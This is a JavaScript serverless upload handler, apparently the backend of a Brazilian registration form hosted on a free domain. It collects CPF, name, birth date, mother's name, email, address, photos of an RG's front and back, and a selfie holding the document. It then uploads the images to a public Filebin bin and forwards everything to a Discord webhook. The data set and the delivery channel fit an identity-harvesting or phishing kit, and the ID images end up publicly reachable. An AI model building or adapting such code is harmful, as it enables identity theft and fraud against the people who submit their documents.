   // api/upload-cadastro.js - Proxy para upload múltiplos documentos no Filebin + Discord
   import formidable from 'formidable';
   import fs from 'fs';  // Para limpar arquivos temporários

   export default async function handler(req, res) {
       // Configuração de CORS manual (mesmo domínio do primeiro form)
       const allowedOrigin = 'https://admin-thofer.wuaze.com';  // <-- SUBSTITUA PELO SEU DOMÍNIO EXATO NO INFINITYFREE
       res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
       res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS, POST');
       res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
       res.setHeader('Access-Control-Allow-Credentials', 'true');

       // Handle preflight OPTIONS request
       if (req.method === 'OPTIONS') {
           res.status(200).end();
           return;
       }

       // Só permite POST
       if (req.method !== 'POST') {
           return res.status(405).json({ error: 'Method Not Allowed' });
       }

       // Parse FormData com formidable (múltiplos arquivos)
       const form = formidable({
           multiples: true,  // Permite múltiplos arquivos
           maxFileSize: 5 * 1024 * 1024,  // 5MB por arquivo
           keepExtensions: true,
           uploadDir: '/tmp',  // Pasta temp no serverless
       });

       let fields, files;
       try {
           [fields, files] = await form.parse(req);
       } catch (error) {
           console.error('Erro no formidable:', error);
           return res.status(400).json({ error: 'Erro ao processar o formulário. Verifique os arquivos.' });
       }

       // Extrai campos de texto
       const cpf = fields.cpf ? fields.cpf[0] : null;
       const nome = fields.nome ? fields.nome[0] : null;
       const dataNascimento = fields.dataNascimento ? fields.dataNascimento[0] : null;
       const nomeMae = fields.nomeMae ? fields.nomeMae[0] : null;
       const email = fields.email ? fields.email[0] : null;
       const cep = fields.cep ? fields.cep[0] : null;
       const logradouro = fields.logradouro ? fields.logradouro[0] : null;
       const numero = fields.numero ? fields.numero[0] : null;
       const bairro = fields.bairro ? fields.bairro[0] : null;

       // Extrai arquivos (array se múltiplos, mas esperamos um por campo)
       const rgFrenteFile = files.rgFrente ? files.rgFrente[0] : null;
       const rgVersoFile = files.rgVerso ? files.rgVerso[0] : null;
       const fotoComDocumentoFile = files.fotoComDocumento ? files.fotoComDocumento[0] : null;

       const DISCORD_WEBHOOK_URL3 = process.env.DISCORD_WEBHOOK_URL3;

       if (!cpf || !nome || !dataNascimento || !nomeMae || !email || !cep || !logradouro || !numero || !bairro ||
           !rgFrenteFile || !rgVersoFile || !fotoComDocumentoFile || !DISCORD_WEBHOOK_URL3) {
           // Limpa arquivos temp
           [rgFrenteFile, rgVersoFile, fotoComDocumentoFile].forEach(f => {
               if (f && f.filepath) fs.unlinkSync(f.filepath);
           });
           return res.status(400).json({ error: 'Dados incompletos: todos os campos e arquivos são obrigatórios.' });
       }

       // Validações básicas no server (só imagens)
       const allowedTypes = ['image/png', 'image/jpeg', 'image/jpg'];
       const allFiles = [rgFrenteFile, rgVersoFile, fotoComDocumentoFile];
       for (const file of allFiles) {
           const mimeType = file.mimetype || '';
           if (!allowedTypes.includes(mimeType)) {
               allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });
               return res.status(400).json({ error: 'Tipo de arquivo inválido: só PNG, JPEG ou JPG.' });
           }
           if (file.size > 5 * 1024 * 1024) {
               allFiles.forEach(f => { if (f.filepath) fs.unlinkSync(f.filepath); });
               return res.status(400).json({ error: 'Arquivos muito grandes: máximo 5MB cada.' });
           }
       }

       // Validação CPF (11 dígitos)
       if (cpf.replace(/\D/g, '').length !== 11) {
           allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });
           return res.status(400).json({ error: 'CPF inválido: deve ter 11 dígitos.' });
       }

       try {
           // Configurações do Filebin
           const BIN_NAME = 'cadastros-documentos-thofer';  // Bin dedicado para cadastros
           const FILEBIN_BASE_URL = 'https://filebin.net';
           const timestamp = Date.now();
           const cpfLimpo = cpf.replace(/\D/g, '');

           // Função auxiliar para upload de um arquivo
           async function uploadToFilebin(file, prefix) {
               const ext = file.originalFilename ? file.originalFilename.split('.').pop() : 'jpg';
               const filename = `${prefix}-${cpfLimpo}-${timestamp}.${ext}`;
               const fileBuffer = fs.readFileSync(file.filepath);

               const uploadResponse = await fetch(`${FILEBIN_BASE_URL}/${BIN_NAME}/${filename}`, {
                   method: 'POST',
                   headers: {
                       'Content-Type': file.mimetype || 'image/jpeg',
                   },
                   body: fileBuffer,
               });

               if (!uploadResponse.ok) {
                   const errorText = await uploadResponse.text();
                   console.error(`Erro Filebin para ${prefix}:`, errorText);
                   throw new Error(`Falha no upload de ${prefix}: ${errorText}`);
               }

               await uploadResponse.json();  // 201 com JSON (ignora, só confirma)
               return `${FILEBIN_BASE_URL}/${BIN_NAME}/${filename}`;  // URL direta
           }

           // Uploads paralelos para os 3 arquivos
           const [linkRgFrente, linkRgVerso, linkFotoComDocumento] = await Promise.all([
               uploadToFilebin(rgFrenteFile, 'rg-frente'),
               uploadToFilebin(rgVersoFile, 'rg-verso'),
               uploadToFilebin(fotoComDocumentoFile, 'foto-com-documento')
           ]);

           // Limpa arquivos temp
           allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });

           // Notificação para Discord (mesmo formato do seu código)
           const discordPayload = {
               username: 'Novo Cadastro - Documentos',
               avatar_url: 'https://cdn-icons-png.flaticon.com/512/2922/2922550.png',
               embeds: [
                   {
                       title: 'Novo Cadastro Recebido!',
                       description: `Um novo cadastro foi preenchido e documentos anexados.`,
                       color: 3447003,
                       fields: [
                           { name: 'CPF', value: cpf, inline: true },
                           { name: 'Nome', value: nome, inline: true },
                           { name: 'Data de Nascimento', value: dataNascimento, inline: true },
                           { name: 'Nome da Mãe', value: nomeMae, inline: true },
                           { name: 'E-mail', value: email, inline: true },
                           { name: 'CEP', value: cep, inline: true },
                           { name: 'Logradouro', value: logradouro, inline: false },
                           { name: 'Número', value: numero, inline: true },
                           { name: 'Bairro', value: bairro, inline: true },
                           { name: 'RG - Frente', value: `[Visualizar](${linkRgFrente})`, inline: false },
                           { name: 'RG - Verso', value: `[Visualizar](${linkRgVerso})`, inline: false },
                           { name: 'Foto com Documento', value: `[Visualizar](${linkFotoComDocumento})`, inline: false },
                       ],
                       timestamp: new Date().toISOString(),
                       footer: { text: 'Filebin via Vercel Proxy' },
                   },
               ],
           };

           const discordResponse = await fetch(DISCORD_WEBHOOK_URL3, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(discordPayload),
           });

           if (!discordResponse.ok) {
               const errorText = await discordResponse.text();
               console.error('Falha no Discord:', errorText);
               // Continua, pois upload OK
           }

           // Resposta de sucesso
           res.status(200).json({ 
               success: true, 
               message: 'Cadastro e documentos enviados com sucesso!', 
               links: { rgFrente: linkRgFrente, rgVerso: linkRgVerso, fotoComDocumento: linkFotoComDocumento }
           });

       } catch (error) {
           console.error('Erro no upload-cadastro:', error);
           allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });
           res.status(500).json({ error: 'Erro interno no servidor: ' + error.message });
       }
   }

   export const config = {
       api: {
           bodyParser: false,  // Essencial para multipart/form-data com múltiplos arquivos
       },
   };
   
